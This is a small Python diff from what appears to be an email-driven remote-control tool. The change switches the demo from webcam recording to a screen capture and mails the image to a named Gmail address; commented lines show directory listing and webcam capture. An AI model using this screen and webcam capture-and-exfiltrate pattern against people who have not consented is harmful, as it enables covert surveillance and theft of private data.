@@ -102,22 +102,22 @@ def main():
         # html = show_tree('C:\\Users\\Admin\\Downloads\demo1')
         # request = 'TREE C:\\Users\\Admin\\Downloads\demo1'
 
-        # data, msg = screen_shot()
-        # request = 'SCREEN get image'
+        result = screen_shot()
+        request = 'SCREEN get image'
 
         # result = webcam_shot()
         # request = 'WEBCAM get image'
 
-        result = webcam_record(5)
-        request = 'WEBCAM get video 5'
+        # result = webcam_record(5)
+        # request = 'WEBCAM get video 5'
 
         content = {
             'html': html_mail(request, result['html']),
             'data': result['data']
         }
         
-        mail = build_email_content(REMOTE_MAIL, ['hoangnhuquynh2015@gmail.com'], 'Demo send mail', content)
-        # mail = build_email_content(REMOTE_MAIL, ['bot.remote.2@gmail.com'], 'Demo WEBCAM video attachment', content)
+        # mail = build_email_content(REMOTE_MAIL, ['hoangnhuquynh2015@gmail.com'], 'Demo send mail', content)
+        mail = build_email_content(REMOTE_MAIL, ['bot.remote.2@gmail.com'], 'Demo SCREEN image attachment', content)
         host_mail.send_mail(mail)
 
         # mail = build_email_content(REMOTE_MAIL, ['bot.remote.2@gmail.com'], 'Demo PNG attachment', content, data = data)
